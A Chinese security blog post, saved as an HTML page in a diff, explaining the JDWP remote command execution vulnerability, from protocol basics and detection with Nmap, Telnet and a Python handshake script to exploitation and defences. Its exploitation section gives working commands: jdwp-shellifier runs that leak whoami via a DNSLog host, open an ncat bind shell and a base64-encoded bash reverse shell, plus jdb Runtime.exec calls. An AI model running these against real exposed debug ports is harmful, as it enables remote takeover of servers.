@@ -1,0 +1,361 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Java,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>浅析JDWP远程命令执行漏洞 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        浅析JDWP远程命令执行漏洞
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2021-08-06T05:02:14.000Z">
+        2021-08-06
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习</p>
+<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="JPDA"><a href="#JPDA" class="headerlink" title="JPDA"></a>JPDA</h3><p>JPDA（Java Platform Debugger Architecture）即Java平台调试体系架构，其整体架构如图：</p>
+<p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/2.png" alt=""></p>
+<p>整体分为三层：</p>
+<ul>
+<li>JVMTI：Java VM Tool Interface即JVM工具接口。Debuggee即被调试者是由被调试的应用程序（未显示）、运行应用程序的VM和调试器后端组成。为了可远程调试，JVM实例必须使用命令行参数<code>-Xdebug</code>以及参数<code>-Xrunjdwp</code>（或<code>-agentlib</code>）显式启动。其中调试器后端是使用JVMTI来定义JVM提供的调试服务；</li>
+<li>JDWP：Java Debug Wire Protocol是Debugger和JVM实例之间的通信协议；</li>
+<li>JDI：Java Debug Interface即Java调试接口，是JDWP协议的客户端，调试器通过其来远程调试目标JVM中的应用；</li>
+</ul>
+<h3 id="JDWP"><a href="#JDWP" class="headerlink" title="JDWP"></a>JDWP</h3><p>JDWP（Java Debugger Wire Protocol）即Java调试线协议，是一个为Java调试而设计的通讯交互协议。在JPDA（Java Platform Debugger Architecture）中，它定义了调试器（Debugger）和被调试的JVM（Debuggee）之间的通信协议。</p>
+<p>具体JDWP协议可参考官方文档：<a href="https://docs.oracle.com/en/java/javase/11/docs/specs/jdwp/jdwp-protocol.html" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/11/docs/specs/jdwp/jdwp-protocol.html</a></p>
+<h2 id="0x02-JDWP远程命令执行漏洞"><a href="#0x02-JDWP远程命令执行漏洞" class="headerlink" title="0x02 JDWP远程命令执行漏洞"></a>0x02 JDWP远程命令执行漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果目标Java应用开启了JDWP服务且对外开放，则攻击者可利用JDWP实现远程代码执行。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>以Windows为例，下载Tomcat到本地，在startup.bat中上面添加如下代码开启debug模式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000</span><br></pre></td></tr></table></figure>
+<p>跑起Tomcat即可。</p>
+<h3 id="FOFA语法"><a href="#FOFA语法" class="headerlink" title="FOFA语法"></a>FOFA语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banner=&quot;jdwp&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><p>有三种常用方式来进行JDWP服务探测，原理都是一样的，即向目标端口连接后发送<code>JDWP-Handshake</code>，如果目标服务直接返回一样的内容则说明是JDWP服务。</p>
+<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>使用Nmap扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV 192.168.192.1 -p 8000</span><br></pre></td></tr></table></figure>
+<p>扫描会识别到JDWP服务，且有对应的JDK版本信息：</p>
+<p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/1.png" alt=""></p>
+<h4 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h4><p>使用Telnet命令探测，需要马上输入<code>JDWP-Handshake</code>，然后服务端返回一样的内容，证明是JDWP服务：</p>
+<p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/3.png" alt=""></p>
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>使用如下脚本扫描也可以，直接连接目标服务发送<code>JDWP-Handshake</code>，然后接受到相同内容则说明是JDWP服务：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client = socket.socket()</span><br><span class="line">client.connect((<span class="string">"127.0.0.1"</span>, <span class="number">8000</span>))</span><br><span class="line">client.send(<span class="string">b"JDWP-Handshake"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> client.recv(<span class="number">1024</span>) == <span class="string">b"JDWP-Handshake"</span>:</span><br><span class="line">    print(<span class="string">"[*]JDWP Service!"</span>)</span><br><span class="line"></span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用可借助以下三个工具。</p>
+<h4 id="jdwp-shellifier"><a href="#jdwp-shellifier" class="headerlink" title="jdwp-shellifier"></a>jdwp-shellifier</h4><p>直接用GitHub上已有的工具：<a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">https://github.com/IOActive/jdwp-shellifier</a></p>
+<p>该工具通过编写了一个JDI（JDWP客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。</p>
+<p>需要Python2运行。</p>
+<p>默认break on是在java.net.ServerSocket.accept方法上，</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t <span class="number">127.0</span>.<span class="number">0.1</span> -p <span class="number">8000</span> --cmd <span class="string">"calc"</span></span><br></pre></td></tr></table></figure>
+<p>直接设置断点函数为<code>java.lang.String.indexOf</code>会更快速：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t <span class="number">127.0</span>.<span class="number">0.1</span> -p <span class="number">8000</span> --break-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"calc"</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/4.png" alt=""></p>
+<p>但是前面的命令虽然执行了但是看不到回显，在Linux环境下可以利用DNSLog外带回显：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"ping -nc 1 `whoami`.xxx.dnslog.cn"</span></span><br></pre></td></tr></table></figure>
+<p>反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"ncat -lvvp 1234 -e /bin/bash"</span></span><br><span class="line"><span class="comment"># 下面这种不能直接运行/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&gt;&amp;1来反弹</span></span><br><span class="line"><span class="comment"># 跟Java的exec()反弹一个原理，可用Base64绕过</span></span><br><span class="line">python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span></span><br></pre></td></tr></table></figure>
+<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><p>在msf中可以使用<code>exploit/multi/misc/java_jdwp_debugger</code>模块进行攻击利用。</p>
+<p>原理是去找sleeping中的线程，然后下发单步指令是程序断下来，从而触发命令执行。</p>
+<h4 id="jdb"><a href="#jdb" class="headerlink" title="jdb"></a>jdb</h4><p>jdb是JDK中自带的命令行调试工具。</p>
+<p>这里是按照msf中的方式搞：</p>
+<ol>
+<li>attach到远程JDWP服务；</li>
+<li><code>threads</code>命令查看所有线程，查找sleeping的线程；</li>
+<li><code>thread sleeping的线程id</code>，然后<code>stepi</code>进入该线程；</li>
+<li>通过<code>print|dump|eval</code>命令，执行Java表达式从而达成命令执行；</li>
+</ol>
+<p>这里本地<code>-attach</code>参数连接会出差，换为下面的方式：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=<span class="number">127.0</span>.<span class="number">0.1</span>,port=<span class="number">8000</span></span><br></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/5.png" alt=""></p>
+<p>当然是可以实现直接回显的，可自行研究。</p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
+<li>关闭JDWP服务，或限制JDWP服务不对外开放；</li>
+<li>关闭Java Debug模式；</li>
+</ul>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" target="_blank" rel="noopener">Hacking the Java Debug Wire Protocol – or – “How I met your Java debugger”</a></p>
+<p><a href="https://docs.oracle.com/en/java/javase/11/docs/specs/jpda/architecture.html" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/11/docs/specs/jpda/architecture.html</a></p>
+<p><a href="https://xz.aliyun.com/t/7303" target="_blank" rel="noopener">JDWP无依赖攻击</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本概念"><span class="toc-text">0x01 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JPDA"><span class="toc-text">JPDA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JDWP"><span class="toc-text">JDWP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JDWP远程命令执行漏洞"><span class="toc-text">0x02 JDWP远程命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FOFA语法"><span class="toc-text">FOFA语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务探测"><span class="toc-text">服务探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Telnet"><span class="toc-text">Telnet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#脚本"><span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jdwp-shellifier"><span class="toc-text">jdwp-shellifier</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf"><span class="toc-text">msf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jdb"><span class="toc-text">jdb</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-text">0x03 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/" rel="next" title="浅析Dubbo HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）">
+          浅析Dubbo HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2021/09/01/利用MySQL8-0新特性绕过WAF/" rel="prev" title="浅析MySQL8.0新特性利用">
+            浅析MySQL8.0新特性利用
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
